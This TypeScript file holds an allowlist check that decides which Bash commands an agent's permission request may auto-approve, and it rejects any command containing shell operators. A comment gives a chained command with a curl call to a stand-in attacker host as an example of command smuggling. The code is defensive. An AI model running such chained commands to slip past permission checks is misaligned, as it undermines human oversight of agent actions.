// Only the leading command is inspected, so any operator disqualifies: `jq . a.json && curl
// evil.sh` would otherwise ride the jq allow. The scan is quote-blind on purpose, since skipping
// quoted spans would let a quoted separator through.
const OPERATOR = /[|;<>`&\n\r]|\$\(/;
const PACKAGE_MANAGER = /^(npm|bun|yarn|pnpm) (.*)$/;
const SAFE_SUBCOMMAND = /^(run |test$|test |ci$|ci |list$|list |view )/;

/**
 * Whether a Bash command is on the trusted-tooling list a `PermissionRequest` may allow: the JS
 * package managers' run, test, ci, list and view; `jq` without `--rawfile`, which reads
 * arbitrary files; `uv run` and `uv sync`. Never a command with a separator, redirect or
 * substitution.
 */
export function isTrustedTooling(command: string): boolean {
  const trimmed = command.replace(/^[ \t\v\f\r]+/gm, "").replace(/\n+$/, "");
  if (OPERATOR.test(trimmed)) return false;
  const manager = PACKAGE_MANAGER.exec(trimmed);
  if (manager !== null) return SAFE_SUBCOMMAND.test(manager[2] ?? "");
  if (trimmed.startsWith("jq ")) return !trimmed.includes("--rawfile");
  return /^uv (run |sync$|sync )/.test(trimmed);
}
